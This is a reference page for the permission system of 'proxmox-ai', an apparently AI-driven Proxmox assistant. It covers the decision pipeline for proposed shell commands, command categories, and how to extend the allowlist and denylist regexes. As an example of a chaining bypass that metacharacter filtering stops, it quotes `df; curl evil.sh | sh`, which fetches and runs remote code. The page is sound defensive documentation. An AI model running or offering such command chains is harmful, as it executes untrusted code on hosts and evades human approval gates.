# Permissions reference

How proxmox-ai decides what happens to a proposed command, what each
Permissions-tab category covers, and how to extend the allowlist, denylist,
and category mappings.

All enforcement lives in `backend/permissions.py` on the CT
(`/opt/proxmox-ai/backend/permissions.py`). After editing it, restart the
backend:

```bash
pct exec 130 -- systemctl restart proxmox-ai
```

## Decision pipeline

Every proposed command goes through `check_execution()` in this exact order.
The first matching rule wins. **The same check runs twice**: once when the
request is created, and again at execution time — so tightening a setting or
flipping the kill switch immediately blocks pending approvals.

| # | Check | Result |
|---|-------|--------|
| 1 | Kill switch (`/etc/proxmox-ai/DISABLED` exists) | **blocked** |
| 2 | `server_access` master switch off | **blocked** |
| 3 | Rate limit (`max_commands_per_minute`, default 10, **per user**) | **blocked** |
| 4 | Command matches the **denylist** | **confirm** — always, even in `auto` mode |
| 5 | Category is `guest_exec` and the guest-exec toggle is off | **blocked** |
| 6 | Category mode is `off` | **blocked** |
| 7 | Category mode is `confirm` | **confirm** |
| 8 | Category mode is `allow` → falls through to `ssh_mode` | see below |

When the category is `allow`, `ssh_mode` makes the final call:

| `ssh_mode` | Result |
|------------|--------|
| `off` | **blocked** |
| `confirm` | **confirm** |
| `allowlist` | **auto** if the command matches the allowlist, else **confirm** |
| `auto` | **auto** |

So a category set to `allow` can still require approval — `ssh_mode` is the
second gate for raw shell commands.

## Category modes

Each category in Settings → Permissions has three modes:

| Mode | Effect |
|------|--------|
| `off` | Commands in this category are blocked outright |
| `confirm` | Always require clicking **Approve** in chat |
| `allow` | Eligible to auto-run — final decision deferred to `ssh_mode` |

## Category reference

Categories are assigned by regex in `CATEGORY_MAP`
(`backend/permissions.py`). The first matching pattern wins; anything that
matches nothing falls into `host_system`.

| Category | Covers | Example commands |
|----------|--------|------------------|
| `read_status` | Read-only status/inspection | `pvesh get …`, `qm list/status/config`, `pct list/status/config`, `df`, `free`, `uptime`, `uname`, `systemctl status`, `journalctl`, `lsblk`, `pveversion`, `pvecm status`, `zpool status/list`, `zfs list`, `ip addr/route` |
| `vmct_lifecycle` | VM/CT state changes | `qm`/`pct` `start`, `stop`, `shutdown`, `reboot`, `reset`, `suspend`, `resume`, `clone`, `migrate`, `create`, `destroy`, `set`, `resize`, `snapshot`, `rollback` |
| `storage` | Disks, pools, filesystems | `pvesm`, `zfs`, `zpool`, `lvcreate`, `lvremove`, `mkfs`, `mount`, `umount` |
| `network_firewall` | Network and firewall changes | `ip link set`, `ifup`, `ifdown`, `iptables`, `nft`, `pve-firewall` |
| `users` | Account management | `pveum`, `useradd`, `userdel`, `passwd` |
| `guest_exec` | Executing inside a guest | `qm agent …`, `pct exec …` — additionally gated by the **guest exec** toggle in Settings → Security |
| `host_system` | Fallback for everything else | Any command not matched above (e.g. `apt`, `systemctl restart`, `cp`) |

Recommended starting posture: `read_status: allow`,
`vmct_lifecycle: confirm`, everything else `off` — opt in later.

## Adding items

### Add a command to the allowlist

The allowlist (`ALLOWLIST_PATTERNS`) is the set of commands that auto-run
when `ssh_mode=allowlist`. It is hardcoded — not in the UI or `config.json`.

Edit `/opt/proxmox-ai/backend/permissions.py` and append a regex:

```python
ALLOWLIST_PATTERNS = [
    # ...existing patterns...
    r"^smartctl\s+-a\b",          # new: allow SMART disk health reads
]
```

Guidelines:

- Patterns are matched with `re.search` against the stripped command —
  anchor with `^` to match from the start.
- **Commands containing shell metacharacters are never allowlist-auto-run**:
  `;`, `|`, `&`, backticks, `$(...)`, `${...}`, `<`, `>`, or newlines cause an
  immediate fallthrough to `confirm`. This prevents chaining bypasses like
  `df; curl evil.sh | sh`.
- Keep the allowlist **read-only**. Anything state-changing belongs in a
  category set to `confirm`.
- The denylist wins over the allowlist — a command matching both still
  requires approval.
- Restart the backend after editing.

### Add a command to the denylist

The denylist (`DENYLIST_PATTERNS`) forces explicit approval regardless of
mode. Append a regex the same way:

```python
DENYLIST_PATTERNS = [
    # ...existing patterns...
    r"\bapt(-get)?\s+purge\b",    # new: package purges need approval
]
```

### Add commands to a category / add a new category

Category assignment is the `CATEGORY_MAP` list of `(regex, category)` tuples.
The **first** match wins, so order matters — put specific patterns before
broad ones.

To route additional commands into an existing category, extend its regex:

```python
CATEGORY_MAP = [
    # ...existing entries...
    (r"^(pvesm|zfs|zpool|lvcreate|lvremove|mkfs|mount|umount|smartctl)\b", "storage"),
    # ...
]
```

To add a brand-new category:

1. Add the name to `CATEGORIES` in `backend/config.py`.
2. Add a `(regex, "your_category")` entry to `CATEGORY_MAP` in
   `backend/permissions.py`.
3. Restart the backend — it appears in Settings → Permissions with default
   mode `off`.

### Test a change

After restarting, propose a matching command in chat and check the decision
in the audit log:

```bash
pct exec 130 -- tail -1 /var/log/proxmox-ai/audit.log
```

The `reason` field tells you exactly which rule fired (see
[troubleshooting.md](troubleshooting.md) §3.1 for the full reason table).
